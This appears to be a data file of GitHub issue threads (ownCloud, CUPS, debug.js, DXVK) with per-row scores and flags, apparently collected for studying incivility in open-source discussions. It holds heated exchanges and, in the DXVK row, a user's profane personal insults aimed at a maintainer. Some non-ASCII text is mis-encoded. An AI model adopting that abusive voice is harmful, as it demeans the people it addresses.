would be to write an independent upgrade script that does it all on its own, supporting all apps and databases. That, too, is a huge task, but less likely to break everything. I wouldn't oppose that last thing but who's going to do the work? For now, I'm writing on a blog post to help ppl manually upgrade from the Debian package to our official 8.0 package, then 8.1, then 8.2 and then they can decide if they want 9.0 already or not. (there is no reason to stick to anything older than 8.2, at least not if you value your data and security). Help testing that how-to would be super welcome... I was hoping to have a draft last week but stuff got in the way, will work on it today.  I see, and I think that what the maintainer tried to do was to solve it the best he could (his own words). Reacting like 'I'd even consider a warning about not using Debian packages on our download page fair enough' is not helping in the discussion. I just wish that for the sake of ownCloud's relationship with distributions you acknowledge it. Maybe some of you think distros are not important ('Don't worry guys, owncloud is going to be removed from Debian anyway and is also planned for Fedora. So this problem is going to resolve itself pretty soon.'), but as a user of both (apps and distros) I assure you most people just use that. In the particular problem, I see you also have upgrade problems. What I·∏ø trying to say is that the maintainer is trying his best for the time being, just like you and anybody else.  That's outrightly wrong. See  on how Fedora did handle this. The Fedora packagers did actually get in touch with us in advance unlike some other distribution packagers üòâ  @friend I was just quoting. Bravo for Fedora. Also, keeping that attitude doesn't help a little bit. Yes, I agree that there was some kind of miscommunication, but reacting that way does not put you in a good light either. So what I think both sides should do is to get together and work on it. I hope the invitation for the meeting in September is taken, but it's my opinion that should think of other ways to better communicate with downstream.  Hmm, I just noticed the comment I was quoting was probably not from someone from the ownCloud community  that's the case, my mistake. In any case, what he says after that goes in line to what I want to say here.  I know he wanted to solve it the best way he could. But that doesn't make it a good idea. Doing open hart surgery on yourself might be done with great intentions but it's not smart either way. We expressed worries as we ourselves would not feel confident in our own ability to do this and we certainly didn't and don't expect a packager who doesn't even talk to us to do a decent job protecting the data of our users in his free time. Add to that the thought of having to deal with the bug reports and many broken installations and damage to our reputation this would cause and you can imagine why we responded with a ""please don't do this"". That was our 'official' response, not You can't blame us for discussing this internally and people then giving their opinion. That isn't our communication and really, don't expect me to tell people to stop giving their opinion on our own mailing lists, bug tracker and other communication channels. Honestly, I don't think we did anything particularly wrong here. We asked downstream not to risk the data of our users. They got upset and dropped ownCloud packaging. Their right, not our fault. As I said, I'll write a blog to help users migrate from Debian packages to our packages. Feedback and help with that would be welcome. I see no point in doing anything else as the current ownCloud packagers at Debian have made it very clear they don't want to continue working on packages. If somebody else steps up, they'll get the same support anybody else (like Fedora) gets when they ask. We're of course critical of the distribution rules that make packaging ownCloud harder than it needs to be, but that's an entirely different issue and other distributions are starting to move to fix that (eg snappy, Project Atomic, XDG-Apps etc) so in time, Debian will probably become a good place for ownCloud again. With regards to upgrade problems on the ownCloud side sure. ownCloud is very flexible and it is nearly impossible to test all combinations of technologies we support without more help. Our packages aren't perfect either and we're not terribly happy with the deployment options we can give to users. Help with the packages is of course welcome, you can find sources here. If you don't mind I'll close this issue. I'll share steps on upgrading Debian packages here when I've got some, would love to hear if they work and what feedback you have.  Ok, sorry for the confusion, but from a user perspective, I think I just fell into a similar error that would be to report a bug here about the Debian packaging. I think you should try to use a less public method for your internal discussions; the issue being public doesn't help distinguish form an internal discussion. Well, that package version was aimed to , which by default you have to jump over several hoops just to get one package form it. People who use it know things might break, but it's a Debian mechanism to pretest packages. I agree it's not a complete solution and probably a sloppy one. My aim with that paragraph was to highlight that in both sides, like everywhere else, software is always WIP and that you will most always find flaws. Trying to say ""don't point fingers"" I ended pointing a finger, how ironic... (  @friend don't worry about pointing fingers. Yes, there are issues on all sides, certainly. Sorry if I got overly defensive. About our internal discussions being public - that is a property of open source communities. At least, we like it that way. Our Debian friends made some stingy comments about us on their mailing list too - you won't see me come in and complain about them, I respect that that is the place where they have their discussions and they are free to say what they like. I'd be upset if it ended up in an announcement or if they send it to OUR mailing lists, that's different. What I mean is I see our and their mailing lists and infrastructure as our and their living rooms. With open doors and windows ;-) You can say what you like and if people overhear a conversation and get upset, well, perhaps they shouldn't have gone to that living room. But if you go to somebody else's' living room and yell at them, now THAT is impolite. I know about Experimental but it did show a scary direction development was taking (and even there could lead to data loss issues). Now, as said earlier, I won't say it is impossible to get this right, but we were (and are) very skeptical and then somebody doing it alone... I know, engineers are often like ""how hard could it be"" but the answer usually is ""harder than you thought"". Certainly in this case.  Meanwhile, I'm trying to figure out how to upgrade from the Debian packages to ours. I'm currently guessing the process would be something like this  make a backup of the database (and, if possible, the data folder) backup the config file and move the data folder in a temporary, safe place uninstall the current ownCloud packages install upstream ownCloud 8 packages and put in the data folder and config files run the updater via the command line  Any feedback on that, perhaps? I'd really appreciate help here ;-)  @friend Some pointers where given by @friend in  thanks for that!  See  please ",51,7,301,0,0,189,4,y,
core/owncloud/2495,0.086802145,owncloud,core,Setup warning : WebDAV interface seems to be broke,19087,148,731,0,21,"By connecting to admin account and access to ""Admin"" screen, the following warning is shown Setup Warning Your web server is not yet properly setup to allow files synchronization because the WebDAV interface seems to be broken. Please double check the installation guides. I have this message after an installation with the web-installer. I'm sorry but it still an issue (not resolve as   After an automatic installation, have this kind of message who refer to the manual installation ( in not helpfull for non-developer users. Moreover, the alert don't give enough information to understand what is the trouble.  Please read the contribution guidelines ;)  INSTALL 1  Operating system   Linux mini 3.2.0-39-powerpc-smp #62-Ubuntu Web server apache2 Database sqlite PHP version 5.3    version 5.0.0 isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception_NotImplemented' with message 'Not Implemented' in /var/www/cloud/3rdparty/Sabre/DAV/Client.php436 Stack trace #0 /var/www/cloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /var/www/cloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /var/www/cloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /var/www/cloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/cloud/...') #4 [internal function] __lambda_func(Array) #5 /var/www/cloud/lib/router.php(127) call_user_func('?lambda_131', Array) #6 /var/www/cloud/lib/base.php(606) OC_Router-&gt;match('/settings/admin') #7 /var/www/cloud/index.php(28) OChandleRequest() #8 {main} full   2  i tryed here with https and self signed certificate Operating system   Linux apache-11c.w4a.fr 2.6.32-379.22.1.lve1.2.12.el6.x86_64 Web server apache2 Database mysql PHP version 5.3 more info   version 5.0.0 isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request Peer certificate cannot be authenticated with known CA certificates (error code 60)' in /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php412 Stack trace #0 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/lib/route.php(113)  runtime-created function(1) require_once('/datas/vol2/w4a...') #4 [internal function] __lambda_func(Array) #5 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/lib/router.php(127) call_user_func('?lambda_49', Array) #6 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/lib/base.php(606) OC_Router-&gt;match('/settings/admin') #7 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/index.php(28) OChandleRequest() #8 {main}   21.03.2013 1132 Warning PHP curl_setopt_array() [&lt;a href='function.curl-setopt-array'&gt;function.curl-setopt-array&lt;/a&gt;] CURLOPT_FOLLOWLOCATION cannot be activated when safe_mode is enabled or an open_basedir is set at /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php#464 full  on both install, with same server config, all was worked fine with 4.5* version. Now, sync is impossible with client due to this issue  Looks like safe_mode is enabled - please disable that ‚ô†` Warning PHP curl_setopt_array() [function.curl-setopt-array] CURLOPT_FOLLOWLOCATION cannot be activated when safe_mode is enabled or an open_basedir is set at /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php#464  Second What version number is in your 3rdparty/Sabre/DAV/Version.php  The sabre version is  '1.7.5' on install 2, it is a mutualized server; i cannot disable safe_mode  generally speaking ownCloud cannot run in safe_mode  I'm sorry, i just rechecked safe_mod is off on both install  (as we can see here   &amp;  the curl warning is telling a different story ;-)  open_basedir can also be the problem  I am also having problem but for MacOSX 1.2.1 Client  is disabled for current user, safe_mode is off  I had the same error, but for me the reason was quite obscure. My webserver is a guest running on private ip address that is NAT'ed at the hosts external interface. A connection from the guest to the public one is ""refused"" so the guest is not able to curl it's own url. Quick fixed by adding a host entry to the private address in /etc/hosts. Need to investigate further why the guest can not connect to the public address (iptables).  btw The warning I had was isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request couldn't connect to host (error code 7)'  This at the end means your setup is not proper to allow WebDAV and sync clients to work without issues. Fix the setup -&gt; fix webdav and have fun with syncing. Generally speaking the webdav test we have incorporated will give you hints that your web server setup is not proper. We cannot solve all your setup issues and we cannot foresee all configuration combinations. The details error message is always int the logs - we try to help out as good as we can. There are cases where we most probably produce false positives - we will fix this if possible.  My situation appears similar (identical?) to what mrvanes reported. My ownCloud server is NATed with a high port mapped to 443, i.e. connecting to  port forwards to  on my LAN. If I connect to the LAN address, e.g.  I do NOT get the error message. If I connect to the WAN address, I do.  when entering administrator page it says that there is something wrong with the webdav interface and i should consider instructions manual for solving the issue. i double checked, here is everything correct - at least depending on those written in that specifiy manual. webdav also works (syncing at least works) so we may talk about false detection of owncloud. owncloud itself throws this &lt;code&gt; sWebDAVWorking NO - Reason exception 'InvalidArgumentException' with message 'The passed data is not valid XML' in /var/www/slc/htdocs/cloud/3rdparty/Sabre/DAV/Client.php531 Stack trace 0 /var/www/slc/htdocs/cloud/3rdparty/Sabre/DAV/Client.php(181) Sabre_DAV_Client-&gt;parseMultiStatus(false) 1 /var/www/slc/htdocs/cloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) 2 /var/www/slc/htdocs/cloud/settings/admin.php(34) OC_UtilisWebDAVWorking() 3 /var/www/slc/htdocs/cloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/slc/ht...') 4 [internal function] __lambda_func(Array) 5 /var/www/slc/htdocs/cloud/lib/router.php(127) call_user_func('?lambda_908', Array) 6 /var/www/slc/htdocs/cloud/lib/base.php(606) OC_Router-&gt;match('/settings/admin') 7 /var/www/slc/htdocs/cloud/index.php(28) OChandleRequest() 8 {main} &lt;/code&gt; to avoid any silly thoughts like safe_mode on or maybe set open_basedir. both are def. OFF or unset. (safe_mode off and open_basedir isnt set). also to prevent talkings about missing php capabilities im offering for a short time phpinfo ( i understand the defending attitude of developers sometimes because nobody wants to hear something ""bad"" about his ""baby"", but i want to remind that many ppl (look into owncloud board) reported/verified that ""bug"" who have upgraded ONLY owncloud (and didnt touch php or the environment at all). so i would suggest we focus on finding the dirty lil mistake somewhere in the source. ) if you need more information related to php, backend stuff u actually using in your source or may some requirements which are not enlisted in the installation manual, gimme a notice! D best regards Simon PS just edit the ""code"" section for better reading.  I had similar problem. This is because of dynamic dns use. To solve it, simply modify your /etc/hosts file     127.0.0.1  why should a working network setup be responsible for development mistakes? and why should anyone modifying a working network setup to a wrong configured one because of ONE piece of php code? oO Thanks for the idea, but its not a solution. i prefer the devs do fix this asap among other bugs.  I think I had the same problem  webDav warning in Admin Panel unable to sync with desktop or iPhone client  I think I had the wrong php modules installed or something was missing, because this resolved the problem! the output was this  well im capable syncing, and i do meet the written requirements. no need to blindly install any modules. If you name a particular extension they may ""need"" i can check if i have it enabled or not and may add it to the configuration. blindly installing modules is unprofessional.  I know that the solution for my problem is not professional. I am not a professional. But I had luck. So I hope that someone (a developer) may extract some usefull information out of my post to get an solution for the problem.  I upgraded from 4.7 to 5.02 using the upgrade app. Prior to the upgrade my system had no issues. At this point my admin page has the following line at the top of the page Your web server is not yet properly setup to allow files synchronization because the WebDAV interface seems to be broken.    Please double check the installation guides. File synchronization is working however, and so is the Owncloud app on my Android tablet. The log messages at the bottom of the page show Error    core    storage backend \OC\Files\Storage\Dropbox not found     April 2, 2013 1934 Not sure what the Dropbox error is about since I am not using the External Storage app, it's disabled.  I also upgraded from 4.8 to 5.03. With Login https.//myserver444 I have the following warning ""Einrichtungswarnung Dein Web-Server ist noch nicht f√ºr Datei-Synchronisation bereit, weil die WebDAV-Schnittstelle vermutlich defekt ist."" Output log isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request couldn't connect to host (error code 7)' in /var/www/html/owncloud/3rdparty/Sabre/DAV/Client.php410 Stack trace #0 /var/www/html/owncloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /var/www/html/owncloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /var/www/html/owncloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /var/www/html/owncloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/html/o...') #4 [internal function] __lambda_func(Array) #5 /var/www/html/owncloud/lib/router.php(127) call_user_func('?lambda_789', Array) #6 /var/www/html/owncloud/lib/base.php(608) OC_Router-&gt;match('/settings/admin') #7 /var/www/html/owncloud/index.php(28) OChandleRequest() #8 {main} Clientsync and Webdav works. With Login  have no warning!  I have the same issue in OC5.0 on my local setup. I use WinXP, Nginx 1.0.12, PHP 5.4.3, MySQL 5. I 've perform some debug of this situation and I found that Sabre DAV Server wait for Authentification header from Sabre DAV Client then it try to connect to server in function isWebDAVWorking() from lib/util.php. But I didn't found any place there Authorization header was sent. I didn't seen the setup warning like in first message, I just seen 504 error instead of it. The $_SERVER['HTTP_AUTHORIZATION'] variable is empty.  Could somebody explain how should work Sabre DAV Server in this case?  Hello I had all the errors above too. I finally got it to work, so the welcome screen to download the app appears without giving an error. How to fix the problem sWebDAVWorking NO - Reason exception 'InvalidArgumentException' with message 'The passed data is not valid XML' in /var/www/slc/htdocs/cloud/3rdparty/Sabre/DAV/Client.php531 Open the file /var/www/owncloud/remote.php got to the last line and change require_once to require Also i add in the /etc/hosts my used dynamic domain to the localhost 127.0.0.1. I added the entry to the host file because my router has a ""nice feature"" it routes all internal requests to my public dynamic ip to the router..... Maybe this helps.  I am still have no idea what things makes this WebDAV failed after all of necessary actions is taken  disable all other DAV server like in cPanel disable webdisk webdav mod rewrite on open_basedir are disabled from both apache and php safe_mode is off disable firewall for test  note for a2enmod in owncloud documentation should be marked as 'debian or ubuntu' command.  I only get the message, when i am using https to connect to my owncloud instance ... i would like to use https, but it seems not to work correctly (  @friend please send a pull request to the documentation repo, its really easy to do ;)  The same problem here. And I have this in my warning log file isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request couldn't connect to host (error code 7)' in /var/www/html/cloud/3rdparty/Sabre/DAV/Client.php410 Stack trace #0 /var/www/html/cloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /var/www/html/cloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /var/www/html/cloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /var/www/html/cloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/html/c...') #4 [internal function] __lambda_func(Array) #5 /var/www/html/cloud/lib/router.php(127) call_user_func('?lambda_8', Array) #6 /var/www/html/cloud/lib/base.php(608) OC_Router-&gt;match('/settings/admin') #7 /var/www/html/cloud/index.php(28) OChandleRequest() #8 {main}  @friend your problem is that your webserver can't connect to itself  Same problem too. My warning log file says  isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request Failed connect to host; Connection timed out (error code 7)' in /var/www/localhost/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php410 Stack trace #0 /var/www/localhost/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /var/www/localhost/htdocs/owncloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /var/www/localhost/htdocs/owncloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /var/www/localhost/htdocs/owncloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/localh...') #4 [internal function] __lambda_func(Array) #5 /var/www/localhost/htdocs/owncloud/lib/router.php(127) call_user_func('?lambda_256', Array) #6 /var/www/localhost/htdocs/owncloud/lib/base.php(608) OC_Router-&gt;match('/settings/admin') #7 /var/www/localhost/htdocs/owncloud/index.php(28) OChandleRequest() #8 {main} OS  Linux Gentoo webserver ¬†lighttpd  I had the same situation as mrvanes and steveAliff.  My ownCloud server is NATed with a high port mapped to 443, i.e. connecting to  port forwards to  on my LAN. Add a line to /etc/hosts 127.0.0.1 myserver.realdomain and execute the iptables command &lt;code&gt; \# iptables -t nat -A OUTPUT -p tcp --dport 8888 -j DNAT --to 127.0.0.1443 &lt;/code&gt;  Hello everyone, who is getting this issue. I've realized, that the strange warning message appears if I use the domain name instead of the IP address (I don't use any forwarding).  to if I change the address as follows  message disappears. So I hope the information will help.  I added 'overwritehost' =&gt; '192.168.1.1' into config/config.php $CONFIG array and the message disapeard. Be sure to check if you're behind a NAT like me and whats your internal server address. Here's where I got the tip  I‚Äôm closing this issue because it has been inactive for a few months. This probably means that the issue is not reproducible or it has been fixed in a newer version. Please reopen if you still encounter this issue with the latest stable version (currently ownCloud 5.0.9) and then please use the issue template. You an also contribute directly by providing a patch ‚Äì see the developer manual. ) Thank you!  I am using 5.0.10 and the issue is still present. But in my case, I was able to resolve it by fixing my firewall, which runs on the same machine as the server. I already posted the finding somewhere else but essentially, the server is doing an access to itself using its external IP address (i.e. not 127.0.0.1) . If the situation is not allowed by iptables, then the server will time out and eventually serve the page to the browser albeit after a long time......  So what‚Äôs the plan of action here?  I came across this too while doing a test-drive install in a VM. The problem was of course with my VM setup. (I used faux vhost name in Apache to mount ownCloud, but forgot to add a corresponding entry in the VM's /etc/hosts, i only had the entry in my bare metal machine's /etc/hosts.) Could you guys add the URL of your test request to the message? If it was present, i'd immediately realize what's going on. Currently it's not visible what kind of check you perform, so it's not obvious how to debug the problem. E.g. Your web server is not yet properly setup to allow files synchronization because the WebDAV interface seems to be broken -- request to "" failed. Please double check the installation guides.  @friend Actually the url that we test shoudn't be important. If you would ""fix"" to this url that you would hide the warning but ownCloud wouldn't work correctly in general because a lot of other services on the internet are still not working. This is the whole point of this warning.  I still think that this warning shoud be shown if full internet access ist not working. This is a feature and not a bug.  @friend So this warning helped you to fix a bug in your firewall. I still think that this warning is a useful feature and not a bug.  @friend Yeah absolutely, the warning helped me fix a configuration issue with my VM. It's very useful. My point was that if that warning conained a bit more info, i'd realize what's the problem a bit sooner. Just sayin' )  I had the same error messages as OP, turns out ownCloud does some requests with empty user agent (bad habit?) and my modsec rules didn't like that so they got blocked. Running pretty much standard OWASP rules. Just adjust them or comment them and error message is gone.  Hi, I'm not sure this should be closed.  The only way I could get the message to disappear on Windows server was to ensure 127.0.0.1 pointed to the website OwnCloud was running on.  That is, in IIS select the site you have OC installed on, open the bindings, Add a new binding with the following values Type http IP Address All assigned Port 80 Host name  (Host name blank) The problem with this approach is it requires the owncloud site to be set to 127.0.0.1. If you run a local  web app on 127.0.0.1, it is no longer available on the same machine as OC. Is it possible to ensure the webdav check using the OC sitename? ",41,6,1632,0,0,897,23,n,
core/owncloud/2862,0.070826715,owncloud,core,The OS X menubar client is spamming my apache/owncloud log file with PROPFIND requests,1324,22,23,0,0,"What's worse is I don't seem to be able to ignore/use Apache's dontlog syntax to resolve it. grep -c PROPF /var/log/httpd/httpd-access.log     2802  That's about 1/4 of the logged requests. PROPFIND and GET requests account for about 4200 requests. This syntax works for other URI requests     SetEnvIfNoCase Request_URI ""^PROPFIND"" dontlog  but not for those. Requests from the desktop/browser are cheerfully ignored but not from the mini-client. I thought it might be something in Apache that sets authenticated requests aside and always logs them but the desktop/browser test disproved that. I find I can't even filter by IP address they still get logged. I haven't had an opportunity to capture and examine packets to see what's ado. It's a low priority issue as I can't use owncloud properly (i.e., with encryption) due to my ISP's peculiar attitudes about security. But perhaps an annoyance that needs sorting.  I‚Äôm closing this issue because it has been inactive for a few months. This probably means that the issue is not reproducible or it has been fixed in a newer version. Please reopen if you still encounter this issue with the latest stable version (currently ownCloud 5.0.9) and then please use the issue template. You an also contribute directly by providing a patch ‚Äì see the developer manual. ) Thank you! ",3,0,51,0,0,61,1,n,
core/owncloud/2932,0.047391393,owncloud,core,Basename couses problems on embedded systems (OpenWRT),1679,10,23,0,0,"I have successfully installed OwnCloud 5.0.4 on WRT1043ND router running OpenWrt Attitude Adjustment 12.09-rc2 image. The only grave issue I had was inability to save and sync filenames with international characters. The problem stems to standard php basename() implementation which only works if setlocale can be set correctly to en_US.UTF-8. Unfortunately, many embedded systems, including OpenWRT and ddwrt, do not have locale support at all. Files and folders are created successfully on disk, but oc_filecache has [name] field populated incorrectly for example folder with full path ""/clientsync/—è—à–µ—ÄƒÖƒçƒô√©√≠√±"" is set with name ""clientsync"", a filename with full path ""/clientsync/—è—à–µ—ÄƒÖƒçƒô√©√≠√±.txt"" will become just "".txt"". As a result, Files web UI points to non existing path, and Sabre WebDAV has same issue propagated from /lib/connector/sabre/node.php, since file full path is reconstructed as folder name . ""/"" . [name]. After I have replaced the references to basename() function to my custom basename_safe() one in /lib/base.php, OwnCloud has started working without a hitch function basename_safe($path, $suffix=null) {     $path = rtrim($path,'/');     $path = explode('/',$path);     return end($path); } By the way, Sabre made a design choice not to use standard basename(), it has it's own solution for basename() Sabre_DAV_URLUtil-&gt;splitPath(). Is it possible to have a configuration variable, which would switch to alternative basename() implementation for the purpose of running OwnCloud on embedded systems?  locale support is essential and systems without it are not supported. Sorry we cant support all devices, but you can always send us a pull request ;) ",4,0,117,0,0,54,1,n,
cups/apple/5315,0.106428805,apple,cups,fix or document proper configuration for specifying default output order,5940,62,74,0.666666667,0,"I have an HP Photosmart Plus B210a which prints pages face up. I am trying to figure out how to configure Cups to print documents so that I don't have to reverse them by hand when they come out of the printer. I found a discussion on linuxquestions.org which summarizes a recommended fix  Add the line  *DefaultOutputOrder ""reverse""  to the file  /etc/cups/ppd/PrinterName.ppd  I have tried this with varying results. I printed twelve two-page documents to try to investigate what is happening. I tried printing via the  command, via Evince and via Okular. I tried using a ppd file with and without the  line, and I also tried specifying a default output order with  of ""reverse"" or ""normal"" lpoptions -dHP_Photosmart_Plus_B210a -o outputorder=reverse ... lpoptions -dHP_Photosmart_Plus_B210a -o outputorder=normal  The results   Ignores ppd line, honors lpoptions setting Evince Ignores lpoptions setting, honors ppd Okular Ignores both lpoptions and ppd  As with the reporter of #1679, I would have expected the PPD which is downloaded by default for my printer to give the ""correct"" behavior by default, which is to say, not requiring me to manually reverse long documents when they come out of the printer. I also tried the solution of #1679, using lpadmin -p printer -o outputorder-default=reverse lpadmin -p printer -o outputorder-default=normal  This setting was honored by Evince but not by  or Okular. Okular's print dialog allows the user to change the ouput ordering, but Evince's print dialog, which appears more ""standard"" to me, says ""Page Ordering Not available"". There was some mention of all documents going through  as a final filter. If this is true then it should be possible for Cups to give users a single point at which to configure output ordering, which works uniformly across all applications which might submit print jobs to Cups. In either case it should be documented what is the preferred way to deal with face-up printers. I humbly offer my suggestion that for ""outputorder=reverse"" to work intuitively as a per-job option, then it should interact with the per-printer option as a parity bit, e.g. reverse+reverse=normal, rather than as an ""override"" (reverse+reverse=reverse). In my experimentation it seems to be the latter, and I think this should be documented because it is somewhat different from the way that other options like ""page-ranges"" work. If I write a script to print the odd pages in order and then the even pages in reverse, I feel I should be able to get the same result (manual duplex) regardless of the printer model. In any case where the  man page says   -o outputorder=reverse       Prints pages in reverse order.  I think it maybe should say something like   -o outputorder=(reverse|normal)       Overrides printer output-order setting for this job. With       ""outputorder=reverse"", document will be reversed on       face-down printers, and correctly ordered on face-up       printers; and vice-versa for ""outputorder=normal"".  Here is my PPD file in case it helps HP_Photosmart_Plus_B210a.ppd  OK, so I'm assuming from the list of applications you are using that you are using a Linux distribution of some sort. The PPD comes from the HPLIP project. Unfortunately, this isn't something we can help you with - either the cups-filters raster filter is not honoring the DefaultOutputOrder value in the PPD or the HPLIP driver isn't doing something right. Either way you need to start with your Linux distribution's bug reporter and go from there...  Michael, I can submit the bug elsewhere but do you really mean to suggest that I need to know about HPLIP and cups-filters to understand why three different tools process the options I've set (using your software) in three different ways? What about the other questions I asked? You don't think any of your documentation needs to be fixed? Can you point me to the place in the documentation where you say which of lpadmin/lpoptions/PPD solutions is expected to make the printer work correctly with all CUPS clients? Who takes responsibility when other projects don't know how to interface correctly with your software? Can you give the HP people a hint on how the HP filter would need to be modified so that it respects the  setting not just with Evince print jobs but also with jobs submitted by Okular and ? Or how can Okular be modified so that it prints correctly on inkjets? Is there another brand of inkjet printers, which works correctly with CUPS? What about cups-pdf, I've noticed that when printing to the virtual PDF printer then  doesn't respect the lpadmin setting, Evince doesn't respect the lpoptions setting, and Okular doesn't respect either. Is that still an HP problem? Are you ever grateful to receive bug reports about your project?  @friend The non-CUPS software is not following the standard interfaces that CUPS provides. IOW, this is either a bug in HPLIP or cups-filters. If they follow the standard interfaces you won't have to do a damned thing to have things Just Work‚Ñ¢. We can't fix software that isn't ours... As for pstops, no not all jobs get routed through there. Maybe 18 years ago that was the case, but not today. As for the documentation, it is correct if the underlying driver or filters follow the standard interfaces.  So cups-pdf is HP's problem too? Is there any Linux software you can name that interfaces with CUPS correctly? It would help to have an answer to this question, relating to the configuration of face-up printers ""Can you point me to the place in the documentation where you say which of lpadmin/lpoptions/PPD solutions is expected to make the printer work correctly with all CUPS clients?""  cups-pdf is from another developer. Both depend on cups-filters on Linux, which probably means that the problem lies with cups-filters. We do not document printing solutions for Linux, working or otherwise. We don't write or support the software, and we don't make the distributions. ",19,0,212,0.333333333,0,199,13,y,
debug/visionmedia/547,0.121477028,visionmedia,debug,"Using Uglify-JS debug prints wrong logs (with ""color: #XXXXX"" string)",3740,48,36,0.6,0,"I use ES6 plus Babel plus optional uglify-js. Debug example to show the problem When I do NOT use , everything is ok and the output is However, when using ""color #CC9933""%s` argument.  I'm trying to make a tiny project that shows the problem.  After hours trying to reproduce the issue in a fresh project, I've realized that the issue was due to the fucxxxx . Deleting it and  and calling  again fixed the issue. NPM is becoming really a pain nowadays... Sorry for the noise.  what's your uglifyjs config? I have same issue here. I set collapse_vars to false to avoid this issue before, but it's not working now.  No one, I just use . The issue, in my case, disappeared after a proper  and some complains to NPM stuff (which is a pain today).  Hi there, I've got the same issue over here (though minification happens via tinyify (which uses uglifyjs) in a Babelify-transformed Browserify project. I've tried re-installing the node_modules as suggested by @friend but didn't get anywhere. I don't have a  in this project. @friend  did you find a solution for this?  Thanks for the answer, sorry for the delay. I was using Browserify when I asked my question with uglifiify running uglify-js and could not find a way of directly passing options like  to it. Maybe that's where things got confused ‚Äì I've since switched to Webpack with  and don't have this issue anymore.  I'm seeing the problem in uglifyjs-webpack-plugin, I've set the webpack.config to include and its still giving the weird ""color"" output reported by @friend  It would be good if this was documented, its an obscure hack to work around this issue with debug, and its unlikely people will find it in this closed issue. Even more obscure if you don't explicitly use Uglify, just the default webpack.  I had to add the following to get it to work.  When using tools like angular-cli,  isn't easily changed. It would be great if debug was able to work properly under default production webpack settings.  It would be even greater if libraries worked fine without depending on specific settings in other libraries. I think that's better than ""make it work for my use case, plz"".  This issue is not really closed ... could be great to re-opened it  We're not doing anything crazy, here. We're not pushing Javascript to its limits, we're not expecting any weird or new syntax to work (at least, not until v4 when we switched to ES6). If UglifyJS is messing up code, that's its own fault. Please open a ticket there. It is not the job of a library like this to conform to random tools such as UglifyJS. They are supposed to accommodate the libraries upon which they operate, not the other way around. There is nothing actionable on 's end to fix anything, because there is nothing wrong here. UglifyJS should not be changing functional semantics, so if it does so in a breaking way, take it to the maintainer of UglifyJS. Or you can use something more modern and active, such as Babel or Terser.  AFAIR I've no longer seen this issue by using Terser. 100% agreed with @friend.  We just tell that the printf syntax is unusable in minified version in browser, with a product out of the box and widely used like webpack (18.5M download) / uglify (35.1M). The answer of Uglify, we will know it, there is an option for that. Someone tell that it will cost 5% of js size. Every byte so heavily win is important. I will not make a migration of the minifier for ""only"" a logger problem. I will make the calls without printf syntax. it will be ugly, but in less 10 minutes it will be done. thank you for your no help.  This isn't a logger problem. UglifyJS is breaking your code. That should be setting off alarms and red flags for you. You're welcome. Please take your attitude elsewhere. ",15,4,149,0.2,0,101,2,y,
dxvk/doitsujin/492,0.629190505,doitsujin,dxvk,Farcry 5 Steering Bugs ,683,8,5,0.5,0,"So in Farcry 5 a small issue regarding car steering has come up i can't turn left or right even when remapping the controls Software information Farcry 5 Mazed out System information  GPU R9 290X Drivermesa 18.1.3 Wine version 3.10 e-sync DXVK version 0.61    Input issue -&gt; not a DXVK bug.  Any idea on how to fix the input issue ? I have xinput installed anything else would be big help Sent from my iPhone  This is not the place to ask that question, as it has nothing to do with DXVK.  Getting real tired of lazy Linux assholes whatever dude you want to be a fuck face that‚Äôs not willing to help people so be it Sent from my iPhone  Not going to bother with personal insults. ",2,14,14,0.5,0,36,1,y,
